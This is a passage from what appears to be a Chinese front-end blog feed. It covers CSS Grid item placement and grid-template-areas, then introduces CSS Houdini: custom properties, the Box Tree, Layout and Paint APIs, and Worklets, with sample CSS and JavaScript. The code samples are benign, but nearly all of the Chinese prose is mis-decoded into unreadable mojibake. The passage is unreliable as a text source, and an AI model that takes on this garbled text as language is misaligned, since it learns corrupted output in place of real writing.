æ¥è‘—ï¼Œæˆ‘å€‘èªªæ˜ä¸€ä¸‹å¦‚ä½•å°‡å‰é¢çš„åœ–ç‰‡ä¸­çš„ ** Area ** é€™å€‹ Grid Item æ”¾åˆ°æˆ‘å€‘å‰›å‰›å®šç¾©å¥½çš„ Grid Container ä¸­ï¼Œå› ç‚ºä»–çš„ä½ç½®æ¯”è¼ƒç‰¹æ®Šï¼Œåœ¨å³ä¸‹è§’çš„ä½ç½®ï¼Œè¼ƒå¥½å±•ç¾ CSS Grid æ–¹ä¾¿ä¹‹è™•ã€‚
Grid Item çš„å±¬æ€§åŸºæœ¬ä¸Šå°±æ˜¯å››å€‹ï¼šgrid-column-start, grid-column-end, grid-row-start å’Œ grid-row-endï¼Œä½ ä¹Ÿå¯ä»¥ç°¡åŒ–æˆå…©å€‹ï¼šgrid-column èˆ‡ grid-rowã€‚
grid-column-start, grid-column-end, grid-row-start å’Œ grid-row-end å¯ä»¥æœ‰å››ç¨® Values è¨­å®šï¼š

lineï¼š å°ç…§åˆ° Grid Container ä¸­å®šç¾©çš„ç·šï¼Œå¯ä»¥æ˜¯æ•¸å­—æˆ–åå­—ã€‚
span [number]ï¼šè©² item æœƒæ©«è·¨ [number] å€‹ tracksã€‚
span [name]ï¼šè©² item æœƒæ©«è·¨åˆ°åå­—æ˜¯ [name] çš„ç·šç‚ºæ­¢ã€‚
autoï¼šè‡ªå‹•æ”¾ç½®ï¼Œé¡ç­‰æ–¼ span 1ã€‚

.item-area &#123;  background-color: #C57474;  grid-column-start: line2;  grid-column-end: end;  grid-row-start: row-3-start;  grid-row-end: row-end;	&#125;

è‹¥åªç”¨å…©å€‹å±¬æ€§ï¼Œä¸­é–“ä»¥ &#x2F; éš”é–‹ï¼š
.item-area &#123;  background-color: #C57474;  grid-column: line2 / end;  grid-row: row-3-start / row-end;&#125;

ä»¥æ­¤é¡æ¨ï¼Œå®Œæˆçš„ç¯„ä¾‹å¦‚ä¸‹ï¼š
See the Pen CSS-Grid-Sample by Arvin (@arvin0731) on CodePen.



Another CSS Grid ExampleContainer ä¸åªæœ‰ä¸Šé¢çš„å¯«æ³•ï¼Œé‚„æœ‰ä¸€å€‹å«åš grid-template-areas çš„æ±è¥¿ï¼Œæ­é… Grid-Item çš„ grid-area å¯ä»¥æœ‰æ›´ç°¡å–®çš„å¯«æ³•ä¾†é€²è¡Œæ’ç‰ˆã€‚
æˆ‘å€‘é€™é‚Šæ›å€‹ä¾‹å­ï¼Œä»¥ä¸€èˆ¬ç¶²é è¼ƒå¸¸è¦‹çš„é…ç½®ä¾†èªªæ˜ï¼š
See the Pen CSS-Grid-Sample-Area by Arvin (@arvin0731) on CodePen.


ç”¨äº† grid-template-areas å¾Œï¼Œåœ¨ container çš„ css ä¸­ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥å®šç¾©æ¯å€‹å…ƒç´ çš„ä½ç½®ï¼š
.grid-container &#123;  height: 100vh;  display: grid;  grid-template-columns: 0.25fr 0.25fr 0.25fr 0.25fr;  grid-template-rows: auto;  grid-template-areas: &quot;header header header header&quot;                       &quot;main main . sidebar&quot;                       &quot;footer footer footer footer&quot;;  grid-column-gap: 10px;  grid-row-gap: 15px;&#125;

è£¡é¢çš„ header, main, sidebar èˆ‡ footer å°±æ˜¯åœ¨ Grid-Item ä¸­æˆ‘å€‘è¦æŒ‡å®šçš„åç¨±ï¼š
grid-template-areas çš„æ¯ä¸€è¡Œå®šç¾©äº† Grid-Item å…§å®¹ï¼š

ç¬¬ä¸€è¡Œä»£è¡¨ï¼šheader è¦ä½”æ“šå››è¡Œã€‚
ç¬¬äºŒè¡Œä»£è¡¨ï¼šmain ä½”å…©è¡Œï¼Œè€Œ sidebar ä½”ä¸€è¡Œï¼Œå…¶ä¸­ Â· é¡ä¼¼ placeholder çš„ä½œç”¨ã€‚
ç¬¬ä¸‰è¡Œä»£è¡¨ï¼šfooter ä½”å››è¡Œã€‚

.header &#123;  background-color: #8BC574;  grid-area: header;&#125;.main &#123;  background-color: #748CC5;  grid-area: main;&#125;.sidebar &#123;  background-color: #C57474;  grid-area: sidebar;&#125;.footer &#123;  background-color: #FCE052;  grid-area: footer;&#125;
æ­¤å¤–ï¼Œgrid-column-gap èˆ‡ grid-row-gap å¯ç”¨ä¾†è¨­å®šè¡Œè·ã€‚
One more thingé™¤äº†ä¸Šè¿°çš„åŸºæœ¬å±¬æ€§é‹ç”¨å¤–ï¼Œæœ€å‰é¢æœ‰èªªé CSS Grid è·Ÿ Flex æ˜¯ç›¸è¼”ç›¸æˆï¼Œè€Œå¯¦éš›ä¸Šä»–å€‘å¯ä»¥èª¿é…çš„å±¬æ€§ä¹Ÿæœ‰é¡ä¼¼çš„åœ°æ–¹ã€‚
Grid Container å¯ä»¥ç”¨ justify-items èˆ‡ align-items ä¾†æ§åˆ¶æ¯å€‹ Grid-item çš„ å‚ç›´ èˆ‡ æ°´å¹³ ä½ç½®ã€‚
Grid Item å‰‡æ˜¯å¯ä»¥ç”¨ justify-self èˆ‡ align-self ä¾†æ§åˆ¶è‡ªå·±åœ¨ç¶²æ ¼ä¸­çš„ä½ç½®ã€‚
åƒé€™å€‹ç¯„ä¾‹ä¸­çš„ Sidebar
See the Pen CSS-Grid-Sample-align by Arvin (@arvin0731) on CodePen.


æ­¡è¿å¤§å®¶åƒè€ƒé€™å¹¾å€‹å€‹è¶…è©³ç´°åœ–è§£èªªæ˜ï¼š
Complete guide grid - justify-itemsComplete guide grid - align-itemsComplete guide grid - justify-selfComplete guide grid - align-self
Conclusionç”¨å¹¾å€‹ç°¡å–®çš„ç¯„ä¾‹ä¾†å­¸ç¿’ä¸¦ä»‹ç´¹ CSS Gridï¼Œä½†é‚„æ˜¯å¸Œæœ›å¤§å®¶éƒ½èƒ½ç›´æ¥å» Codepen ä¸Šç©ç©çœ‹ CSS Gridï¼Œä¸€å®šéƒ½æœƒè¢«å…¶æ–¹ä¾¿æ€§çµ¦é©šè±”åˆ°ï¼å‰ç«¯ç™¼å±•é›–ç„¶ç™¾å®¶çˆ­é³´ï¼Œä½†æ˜¯å¾ˆå¤šåŸºæœ¬çš„è¦ç¯„å¦‚æœèƒ½è¶Šä¾†è¶Šçµ±ä¸€è¶Šä¾†è¶Šå¼·å¤§ï¼Œé–‹ç™¼è€…å°±æ›´èƒ½çœå»å„ç¨® hacking çš„æ™‚é–“ï¼Œç”¨ä¾†å‰µé€ æ›´å¤šæœ‰å‰µæ„åˆæœ‰ç¾æ„Ÿçš„ä½œå“ï¼
æœ€å¾Œå†æ¨è–¦ä¸€å€‹ç¶²ç«™ Grid by Exampleï¼Œè£¡é¢ç”¨è¨±å¤šç¯„ä¾‹ä¾†é€²è¡Œæ•™å­¸ï¼Œé é¢ä¹Ÿå¾ˆæ¸…æ¥šä¹¾æ·¨ã€‚æœ‰ä»»ä½•å•é¡Œéƒ½æ­¡è¿å¤§å®¶æŒ‡æ•™ï¼	
è³‡æ–™ä¾†æº
A Complete Guide to Grid
Chris House Guide to Grid
CSS Grid ä»‹ç´¹
Grid by Example
css-grid-polyfill

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>CSS</tag>
        <tag>WEB</tag>
        <tag>CSS-GRID</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS é­”è¡“å¸« Houdini API ä»‹ç´¹</title>
    <url>/2017/05/23/css-houdini/</url>
    <content><![CDATA[å‰è¨€ä»Šå¤©æƒ³ç¹¼çºŒ CSS çš„è­°é¡Œï¼Œå¸¸å¸¸æœƒè¦ºå¾—å­¸ CSS çš„æ–°ç™¼å±•ä¸å¤ªåˆ’ç®—ï¼Œå› ç‚ºæ¯æ¬¡çœ‹åˆ°æ–°çš„ Feature å‡ºç¾ï¼Œéƒ½åªèƒ½ç•¶ä¸‹èˆˆå¥®å€‹å¹¾åˆ†é˜ï¼Œç„¶å¾Œå°±æœƒèªå‘½æ¥å—å¯èƒ½é‚„è¦å†ç­‰å€‹äº”å¹´æ‰èƒ½çœŸæ­£ä½¿ç”¨çš„å¯èƒ½æ€§â€¦å¦‚æœä½ æœ‰è·Ÿæˆ‘ä¸€æ¨£çš„æ„Ÿå—ï¼Œé‚£ä»Šå¤©é€™ç¯‡æ–‡ç« æˆ–è¨±å¯ä»¥å¸¶çµ¦ä½ ä¸€çµ²çµ²å¸Œæœ›ã€‚
åœ¨ç¾ä»Šçš„ Web é–‹ç™¼ä¸­ï¼ŒJavaScript å¹¾ä¹ä½”æ“šæ‰€æœ‰ç‰ˆé¢ï¼Œé™¤äº†æ§åˆ¶é é¢é‚è¼¯èˆ‡æ“ä½œ DOM ç‰©ä»¶ä»¥å¤–ï¼Œé€£ CSS éƒ½ç›´æ¥å¯«åœ¨ JavaScript è£¡é¢äº†ï¼Œå°±ç®—ç€è¦½å™¨éƒ½é‚„æ²’æœ‰å¯¦ä½œçš„è¦æ ¼ï¼Œç¸½æœƒæœ‰äººåšå‡ºå°æ‡‰çš„ Polyfillsï¼Œè®“ä½ å¿«é€Ÿçš„å°‡æ–° Feature æ‡‰ç”¨åˆ° Production ç’°å¢ƒä¸­ï¼Œæ›´åˆ¥ææˆ‘å€‘é‚„æœ‰ Babel ç­‰å·¥å…·å¹«å¿™è½‰è­¯ã€‚
è€Œ CSS å°±ä¸åŒäº†ï¼Œé™¤äº†åˆ¶å®š CSS æ¨™æº–è¦æ ¼æ‰€éœ€çš„æ™‚é–“å¤–ï¼Œå„å®¶ç€è¦½å™¨çš„ç‰ˆæœ¬ã€å¯¦ä½œé€²åº¦å·®ç•°æ›´æ˜¯æ› æ—¥è²»æ™‚ï¼Œå†åŠ ä¸Š CSS ä¸¦é Javascript é€™æ¨£çš„å‹•æ…‹èªè¨€ï¼Œæˆ‘å€‘ç„¡æ³•ç°¡å–®çš„æä¾› Polyfillsï¼Œé ‚å¤šåˆ©ç”¨ PostCSSã€SASS ç­‰å·¥å…·ä¾†å¹«æˆ‘å€‘è½‰è­¯å‡ºç€è¦½å™¨èƒ½æ¥å—çš„ CSSï¼Œè€Œå‰©ä¸‹çš„å°±æ˜¯ç€è¦½å™¨çš„äº‹äº†ã€‚
é€™é‚Šè®“æˆ‘å€‘å›æƒ³ä¸€ä¸‹ï¼Œç€è¦½å™¨åœ¨ç¶²é çš„æ¸²æŸ“éç¨‹ä¸­ï¼Œåšäº†å“ªäº›äº‹æƒ…ï¼Ÿ
source from google
ç€è¦½å™¨çš„ Render Pipeline ä¸­ï¼ŒJavaScript èˆ‡ Style å…©å€‹éšæ®µæœƒè§£æ HTML ä¸¦ç‚ºè¼‰å…¥çš„ JS èˆ‡ CSS å»ºç«‹ Render Treeï¼Œä¹Ÿå°±æ˜¯æ‰€è¬‚çš„ DOM èˆ‡ CSSOMï¼šï¼ˆå°æ–¼ Render Pipeline èˆ‡ Render Tree è‹¥ä¸äº†è§£ï¼Œå¯ä»¥å…ˆçœ‹çœ‹æˆ‘å…ˆå‰çš„æ–‡ç«  Front-end kata 60fpsçš„å¿«æ„Ÿï¼‰
source from google
è€Œå°±ç¾éšæ®µçš„ Web æŠ€è¡“ä¾†çœ‹ï¼Œé–‹ç™¼è€…å€‘èƒ½æ“ä½œçš„å°±æ˜¯é€é JS å»æ§åˆ¶ DOM èˆ‡ CSSOMï¼Œä¾†å½±éŸ¿ç•«é¢çš„è®ŠåŒ–ï¼Œä½†æ˜¯å°æ–¼æ¥ä¸‹ä¾†çš„ Layoutã€Paint èˆ‡ Composite å°±å¹¾ä¹æ²’æœ‰æ§åˆ¶æ¬Šäº†ã€‚
æ—¢ç„¡æ³•è®“å„å®¶ç€è¦½å™¨å¿«é€Ÿä¸¦çµ±ä¸€å¯¦ä½œè¦æ ¼ï¼Œäº¦ä¸èƒ½è¼•æ˜“ç”¢ç”Ÿ Polyfillsï¼Œæ‰€ä»¥åˆ°ç¾åœ¨æˆ‘å€‘ä¾ç„¶ç„¡æ³•å¤§è†½ä½¿ç”¨ Flexboxï¼Œå³ä¾¿å®ƒæ—©åœ¨ 2009 å¹´å°±è¢«æå‡ºäº†â€¦
ä½† CSS ä¸¦éå°±æ­¤é§è¶³ä¸å‰ã€‚
ç‚ºäº†è§£æ±ºä¸Šè¿°å•é¡Œï¼Œç‚ºäº†è®“ CSS çš„é­”åŠ›ä¸å†è¢«ç€è¦½å™¨æŠŠæŒï¼ŒHoudini å°±èª•ç”Ÿäº†ï¼ï¼ˆ Houdini æ˜¯ç¾åœ‹çš„å‰å¤§é­”è¡“å¸«ï¼Œæ“…é•·é€ƒè„«è¡“ï¼Œå¾ˆé©åˆæƒ³å°‡ CSS å¾ç€è¦½å™¨ä¸­è§£æ”¾çš„æ¦‚å¿µï¼‰
CSS HoudiniCSS Houdini æ˜¯ç”±ä¸€ç¾¤ä¾†è‡ª Mozilla, Apple, Opera, Microsoft, HP, Intel, IBM, Adobe èˆ‡ Google çš„å·¥ç¨‹å¸«æ‰€çµ„æˆçš„å·¥ä½œå°çµ„ï¼Œå¿—åœ¨å»ºç«‹ä¸€ç³»åˆ—çš„ APIï¼Œè®“é–‹ç™¼è€…èƒ½å¤ ä»‹å…¥ç€è¦½å™¨çš„ CSS engine é‹ä½œï¼Œå¸¶çµ¦é–‹ç™¼è€…æ›´å¤šçš„è§£æ±ºæ–¹æ¡ˆï¼Œç”¨ä¾†è§£æ±º CSS é•·ä¹…ä»¥ä¾†çš„å•é¡Œï¼š

Cross-Browser isse
CSS Polyfill çš„è£½ä½œå›°é›£

Houdini task force ç›®å‰èµ·è‰äº†ä¸€äº› API è¦ç¯„ï¼Œä¸¦é€æ­¥åŠªåŠ›è®“å…¶é€šé W3Cï¼Œæˆç‚ºçœŸæ­£çš„ Web standardsã€‚ç”±æ–¼éƒ½æ˜¯è‰ç¨¿éšæ®µï¼Œæœ‰äº›ç”šè‡³åªæœ‰è¦åŠƒï¼Œé‚„æœªè¢«çœŸæ­£å¯«å…¥è¦ç¯„ï¼Œæ‰€ä»¥è®Šå‹•å¾ˆå¤§ï¼Œæœ‰äº›æˆ‘ä¹Ÿä¸æ˜¯å¾ˆäº†è§£ï¼Œæ‰€ä»¥å°±å¤§è‡´ä»‹ç´¹ä¸€ä¸‹ï¼Œè‹¥æœ‰éŒ¯èª¤æ‹œè¨—å‹™å¿…å‘ŠçŸ¥ï¼å¦å¤–ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥ç›´æ¥å¾é€™è£¡ CSS Houdini Drafts çœ‹è©³ç´°å…§å®¹ï¼ˆ Drafts çš„æ›´æ–°æ™‚é–“éƒ½éå¸¸è¿‘æœŸï¼Œæ´»èºä¸­çš„è‰ç¨¿ï¼ï¼‰ã€‚
ä¸‹é¢é€™å¼µåœ–æˆ‘å°‡ Google æä¾›çš„ Render pipeline èˆ‡ Houdini: Maybe The Most Exciting Development In CSS Youâ€™ve Never Heard Of ä¸­æåˆ°çš„ pipeline åšå€‹çµåˆå°æ¯”ï¼Œé¡¯ç¤ºå‡º Houdini è©¦åœ–åœ¨ç€è¦½å™¨çš„ Render pipeline ä¸­æä¾›å“ªäº› API çµ¦é–‹ç™¼è€…ä½¿ç”¨ï¼š

å…¶ä¸­ç°è‰²éƒ¨åˆ†å°±æ˜¯åªåœ¨è¦åŠƒéšæ®µï¼Œè€Œé»ƒè‰²éƒ¨ä»½å°±æ˜¯å·²ç¶“å¯«å…¥è¦ç¯„æ­£åœ¨æ¨è¡Œä¸­ã€‚
Houdini API ä»‹ç´¹CSS Properties and Values APIå…ˆä»‹ç´¹ä¸€å€‹æœ€èƒ½å¤ ä½¿ç”¨çš„ APIï¼Œé™¤äº† IE family ä»¥å¤–ï¼ŒChromeã€Firefox èˆ‡ Safari éƒ½å·²ç¶“èƒ½å¤ ç›´æ¥ä½¿ç”¨äº†ï¼ caniuse
ç›¸ä¿¡å¾ˆå¤šäººéƒ½ä½¿ç”¨é CSS Preprocessorsï¼Œä»–çµ¦äºˆé–‹ç™¼è€…åœ¨ CSS ä¸­ä½¿ç”¨è®Šæ•¸çš„èƒ½åŠ›ï¼š
$font-size: 10px;$brightBlue: blue;.mark&#123;  font-size: 1.5 * $font-size;  color: $brightBlue&#125;

ä½†å…¶å¯¦ä½¿ç”¨ Preprocessors é‚„æ˜¯æœ‰å…¶ç¼ºé»ï¼Œåƒæ˜¯ä¸åŒçš„ Preprocessors å°±æœ‰ä¸åŒçš„ Syntaxï¼Œéœ€è¦é¡å¤– setup èˆ‡ compileï¼Œè€Œç¾åœ¨ CSS å·²ç¶“æœ‰åŸç”Ÿçš„è®Šæ•¸å¯ä»¥ä½¿ç”¨äº†ï¼å°±æ˜¯ CSS Properties and Values APIï¼
SCSS èˆ‡ Native CSS Custom Properties çš„ä¸€å€‹ä¸»è¦å·®åˆ¥å¯ä»¥çœ‹ä¸‹åœ–ï¼š

åŸç”Ÿçš„ CSS variable syntaxï¼š
/* declaration */--VAR_NAME: &lt;declaration-value&gt;;/* usage */var(--VAR_NAME)

è®Šæ•¸å¯ä»¥å®šç¾©åœ¨ root element selector å…§ï¼Œä¹Ÿèƒ½åœ¨ä¸€èˆ¬ selector å…§ï¼Œç”šè‡³æ˜¯çµ¦åˆ¥çš„è®Šæ•¸ reuseï¼š
/* root element selector (å…¨åŸŸ) */:root &#123;  --main-color: #ff00ff;  --main-bg: rgb(200, 255, 255);  --block-font-size: 1rem;&#125;.btn__active::after&#123;  --btn-text: &#x27;This is btn&#x27;;  /* ç›¸ç­‰æ–¼ --box-highlight-text:&#x27;This is btn been actived&#x27;; */  --btn-highlight-text: var(--btn-text)&#x27; been actived&#x27;;  content: var(--btn-highlight-text);  /* ä¹Ÿèƒ½ä½¿ç”¨ calc ä¾†åšé‹ç®— */  font-size: calc(var(--block-font-size)*1.5);&#125;body &#123;  /* variable usage */  color: var(--main-color);&#125;

è€Œæœ‰äº†è®Šæ•¸ä»¥å¾Œï¼Œæœƒç‚º CSS å¸¶ä¾†ä»€éº¼å¥½è™•æ‡‰è©²å¾ˆæ˜é¡¯ï¼Œä»–çš„ Use case å¯ä»¥å¤šå¯«ä¸€ç¯‡æ–‡ç« ä¾†ä»‹ç´¹äº†ï¼Œæˆ–æ˜¯å¯ä»¥ç›´æ¥çœ‹é€™ç¯‡çš„è©³ç´°ä»‹ç´¹ï¼Œæˆ‘é€™é‚Šä»‹ç´¹å¹¾å€‹æˆ‘è¦ºå¾—æ¯”è¼ƒæœ‰è¶£çš„ï¼š

æ¨¡æ“¬ä¸€å€‹ç‰¹æ®Šçš„ CSS rule:
 å–®ç´”é€éæ›´æ”¹è®Šæ•¸ä¾†é”åˆ°æ”¹è®Š box-shadow é¡è‰²
 .textBox &#123;--box-shadow-color: yellow;box-shadow: 0 0 30px var(--box-shadow-color);&#125;.textBox:hover &#123;/* box-shadow: 0 0 30px green; */--box-shadow-color: green;&#125;

å‹•æ…‹èª¿æ•´æŸå€‹ CSS rule å…§çš„å„åˆ¥å±¬æ€§ï¼š
 See the Pen Generated colors from CSS custom properties by Serg Hospodarets (@malyw) on CodePen.
 

æ­¤å¤–ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥ç”¨ JavaScript ä¾†æ§åˆ¶ï¼š
const textBox =   document.querySelector(&#x27;.textBox&#x27;);// GETconst Bxshc = getComputedStyle(textBox)    .getPropertyValue(&#x27;--box-shadow-color&#x27;);// SETtextBox.style    .setProperty(&#x27;--box-shadow-color&#x27;, &#x27;new color&#x27;);

éå¸¸å¥½ç”¨çš„ç‰¹æ€§ï¼Œå¹¾ä¹æ‰€æœ‰ä¸»æµç€è¦½å™¨éƒ½å·²ç¶“æ”¯æ´äº†ï¼Œå¤§å®¶å¿«ä¾†ä½¿ç”¨å§ï¼
Box Tree APIBox tree API ä¸¦æ²’æœ‰å‡ºç¾åœ¨ä¸Šåœ–ä¸­ï¼Œä½†åœ¨ Paintin API ä¸­æœƒç”¨åˆ°å…¶æ¦‚å¿µã€‚å¤§å®¶éƒ½çŸ¥é“åœ¨ DOM tree ä¸­çš„æ¯å€‹å…ƒç´ éƒ½æœ‰ä¸€å€‹ Box Modalï¼Œè€Œåœ¨ç€è¦½å™¨è§£æéç¨‹ä¸­ï¼Œé‚„æœƒå°‡å…¶æ‹†åˆ†æˆ fragmentsï¼Œè‡³æ–¼ä»€éº¼æ˜¯ fragmentsï¼Ÿä»¥ drafts ä¸­çš„ä¾‹å­ä¾†è§£é‡‹ï¼š
See the Pen fragments-sample by Arvin (@arvin0731) on CodePen.


ä¸Šé¢çš„ HTML ç¸½å…±å°±æœƒæ‹†å‡ºä¸ƒå€‹ fragmentsï¼š

æœ€å¤–å±¤çš„ div
ç¬¬ä¸€è¡Œçš„ box (åŒ…å« foo bar)
ç¬¬äºŒè¡Œçš„ box (åŒ…å« baz)
åƒåˆ° ::first-line èˆ‡ ::first-letter çš„ f ä¹Ÿæœƒè¢«æ‹†å‡ºä¾†æˆç¨ç«‹çš„ fragments
åªåƒåˆ° ::first-line çš„ oo åªå¥½ä¹Ÿç¨ç«‹å‡ºä¾†
åƒåˆ° ::first-line èˆ‡ åŒ…åœ¨ &lt;i&gt; å…§çš„ bar ç•¶ç„¶ä¹Ÿæ˜¯
åœ¨ç¬¬äºŒè¡Œåº•ä¸‹ä¸”ç‚º italic çš„ baz

è€Œ Box tree API ç›®çš„å°±æ˜¯å¸Œæœ›è®“é–‹ç™¼è€…èƒ½å¤ å–å¾—é€™äº› fragments çš„è³‡è¨Šï¼Œè‡³æ–¼å–å¾—å¾Œè¦å¦‚ä½•ä½¿ç”¨ï¼ŒåŸºæœ¬ä¸Šæ‡‰è©²æœƒè·Ÿå¾Œé¢æœƒä»‹ç´¹çš„ Parser APIã€Layout API èˆ‡ Paint API æœ‰é—œè¯ï¼Œç•¶æˆ‘å€‘èƒ½å–å¾—è©³ç´°çš„ Box Modal è³‡è¨Šæ™‚ï¼Œè¦å®¢è£½åŒ– Layout Module æ‰æ›´ç‚ºæ–¹ä¾¿ã€‚
CSS Layout APILayout API é¡§åæ€ç¾©å°±æ˜¯æä¾›é–‹ç™¼è€…æ’°å¯«è‡ªå·±çš„ Layout moduleï¼ŒLayout module ä¹Ÿå°±æ˜¯ç”¨ä¾† assign çµ¦ display å±¬æ€§çš„å€¼ï¼Œåƒæ˜¯ display: grid æˆ– display: flexã€‚ä½ åªè¦é€é registerLayout çš„ functionï¼Œå‚³å…¥ Layout åç¨±èˆ‡ JS class ä¾†å®šç¾© Layout çš„é‚è¼¯å³å¯ï¼Œä¾‹å¦‚æˆ‘å€‘å¯¦ä½œä¸€å€‹ block-like çš„ Layoutï¼š
blockLike.jsregisterLayout(&#x27;block-like&#x27;, class extends Layout &#123;    static blockifyChildren = true;    static inputProperties = super.inputProperties;    *layout(space, children, styleMap) &#123;        const inlineSize = resolveInlineSize(space, styleMap);        const bordersAndPadding = resolveBordersAndPadding(constraintSpace, styleMap);        const scrollbarSize = resolveScrollbarSize(constraintSpace, styleMap);        const availableInlineSize = inlineSize -                                    bordersAndPadding.inlineStart -                                    bordersAndPadding.inlineEnd -                                    scrollbarSize.inline;        const availableBlockSize = resolveBlockSize(constraintSpace, styleMap) -                                   bordersAndPadding.blockStart -                                   bordersAndPadding.blockEnd -                                   scrollbarSize.block;        const childFragments = [];        const childConstraintSpace = new ConstraintSpace(&#123;            inlineSize: availableInlineSize,            blockSize: availableBlockSize,        &#125;);        let maxChildInlineSize = 0;        let blockOffset = bordersAndPadding.blockStart;        for (let child of children) &#123;            const fragment = yield child.layoutNextFragment(childConstraintSpace);            // é€™æ®µæ§åˆ¶ Layout ä¸‹çš„ children è¦ inline æ’åˆ—            // fragment æ‡‰è©²å°±æ˜¯å‰è¿°çš„ Box Tree API å…§æåˆ°çš„ fragment            fragment.blockOffset = blockOffset;            fragment.inlineOffset = Math.max(                bordersAndPadding.inlineStart,                (availableInlineSize - fragment.inlineSize) / 2);            maxChildInlineSize =                Math.max(maxChildInlineSize, childFragments.inlineSize);            blockOffset += fragment.blockSize;        &#125;        const inlineOverflowSize = maxChildInlineSize + bordersAndPadding.inlineEnd;        const blockOverflowSize = blockOffset + bordersAndPadding.blockEnd;        const blockSize = resolveBlockSize(            constraintSpace, styleMap, blockOverflowSize);        return &#123;            inlineSize: inlineSize,            blockSize: blockSize,            inlineOverflowSize: inlineOverflowSize,            blockOverflowSize: blockOverflowSize,            childFragments: childFragments,        &#125;;    &#125;&#125;);

ä¸Šé¢é€™æ®µ code æ˜¯ä¾†è‡ª houdini draft çš„ç¯„ä¾‹ï¼Œå®Œæ•´æ”¾ä¸Šä¾†æ˜¯æƒ³çµ¦å¤§å®¶çœ‹ä¸€ä¸‹å¯¦ä½œä¸€å€‹ Layout éœ€è¦æ³¨æ„çš„ç´°ç¯€æœ‰å¤šå°‘ï¼Œå…¶å¯¦ä¸¦ä¸æ˜¯å¦‚æƒ³åƒä¸­çš„è¼•é¬†ï¼Œç›¸ä¿¡æœªä¾†æœƒå‡ºç¾æ›´å¤šæ–¹ä¾¿çš„ API è¼”åŠ©é–‹ç™¼ã€‚ï¼ˆæ”¾å¿ƒæ¥ä¸‹ä¾†ä¸æœƒå†æœ‰é€™éº¼å¤š code äº† XDï¼‰
æœ‰äº† Layout APIï¼Œä¸ç®¡æ˜¯è‡ªå·±å¯¦ä½œæˆ–æ˜¯æ‹¿åˆ¥äººå¯«å¥½çš„ Layoutï¼Œä½ éƒ½å¯ä»¥ç›´æ¥å¦‚ä¸‹æ–¹å¼ä½¿ç”¨ï¼š
.wrapper &#123;    display: layout(&#x27;block-like&#x27;);&#125;

CSS Painting APIPainting API èˆ‡ Layout é¡ä¼¼ï¼Œæä¾›ä¸€å€‹å«åš registerPaint çš„æ–¹æ³•ï¼š
å®šç¾© Paint Methodï¼Œé€™é‚Šå·å·ç”¨åˆ°äº†å¾…æœƒè¦ä»‹ç´¹çš„ CSS Propertiesï¼š
simpleRect.jsregisterPaint(&#x27;simpleRect&#x27;, class &#123;    static get inputProperties() &#123; return [&#x27;--rect-color&#x27;]; &#125;    paint(ctx, size, properties) &#123;        // ä¾æ“š properties æ”¹è®Šé¡è‰²        const color = properties.get(&#x27;--rect-color&#x27;);        ctx.fillStyle = color.cssText;        ctx.fillRect(0, 0, size.width, size.height);    &#125;&#125;);

å®£å‘Šä½¿ç”¨ï¼š
.div-1 &#123;    --rect-color: red;    width: 50px;    height: 50px;    background-image: paint(simpleRect);&#125;.div-2 &#123;    --rect-color: yellow;    width: 100px;    height: 100px;    background-size: 50% 50%;    background-image: paint(simpleRect);&#125;

.div-1 èˆ‡ .div-2 å°±å¯ä»¥æ“æœ‰å„è‡ªå®šç¾©å¯¬é«˜é¡è‰²çš„æ–¹å½¢ background-image
Workletsåœ¨ä¸Šè¿°çš„ Layout API èˆ‡ Paint API ä¸­ï¼Œæˆ‘å€‘éƒ½æœ‰æ’°å¯«ä¸€æ”¯ js æª”æ¡ˆï¼Œç”¨ä¾†å®šç¾©æ–°çš„å±¬æ€§ï¼Œç„¶å¾Œåœ¨ css æª”æ¡ˆä¸­å‘¼å«å–ç”¨ï¼Œä½ å¯èƒ½æœƒè¦ºå¾—é‚£æ”¯ js æª”æ¡ˆå°±ç›´æ¥åƒä¸€èˆ¬ web åµŒå…¥ js çš„æ–¹å¼ä¸€æ¨£å³å¯ï¼Œä½†å¯¦éš›ä¸Šä¸¦éå¦‚æ­¤ï¼Œæˆ‘å€‘éœ€è¦é€é Worklets ä¾†å¹«æˆ‘å€‘è¼‰å…¥ã€‚ä»¥ä¸Šé¢çš„ Paint API ç‚ºä¾‹ï¼š
// add a WorkletpaintWorklet.addModule(&#x27;simpleRect.js&#x27;);// WORKLET &quot;simpleRect.js&quot;registerPaint(&#x27;simpleRect&#x27;, class &#123;    static get inputProperties() &#123; return [&#x27;--rect-color&#x27;]; &#125;    paint(ctx, size, properties) &#123;        // ä¾æ“š properties æ”¹è®Šé¡è‰²        const color = properties.get(&#x27;--rect-color&#x27;);        ctx.fillStyle = color.cssText;        ctx.fillRect(0, 0, size.width, size.height);    &#125;&#125;);

åŒç†ï¼ŒLayout API å‰‡æ˜¯ layoutWorklet.addModule(&#39;blockLike.js&#39;)ã€‚
Worklets å…‰åå­—å°±æœ‰é»åƒ Web Worker äº†ï¼Œéƒ½æ˜¯ç¨ç«‹æ–¼ä¸»è¦åŸ·è¡Œç·’ä¹‹å¤–ï¼Œä¸¦ä¸”ä¸ç›´æ¥èˆ‡ DOM äº’å‹•ã€‚ä½ å¯èƒ½æœƒæƒ³é‚£ç‚ºä½•é‚„éœ€è¦æœ‰ä¸€å€‹ Workletsï¼Ÿ
å› ç‚º Houdini æ˜¯å¸Œæœ›å°‡é–‹ç™¼è€…çš„ç¨‹å¼ç¢¼ hook åˆ° CSS engine ä¸­é‹ä½œï¼Œè€Œæ ¹æ“šè¦ç¯„å…§çš„æ•˜è¿°ï¼Œweb worker ç›¸å°ç¬¨é‡ï¼Œä¸é©åˆç”¨ä¾†è™•ç† CSS engine é€™ç¨®å¯èƒ½æœƒç‰½æ‰¯åˆ°æ•¸ç™¾è¬ç•«ç´ åœ–ç‰‡çš„å·¥ä½œã€‚æ‰€ä»¥å¯ä»¥æ¨æ–·ï¼ŒWorklets çš„ç‰¹é»å°±æ˜¯è¼•é‡ä»¥åŠç”Ÿå‘½é€±æœŸè¼ƒçŸ­ã€‚
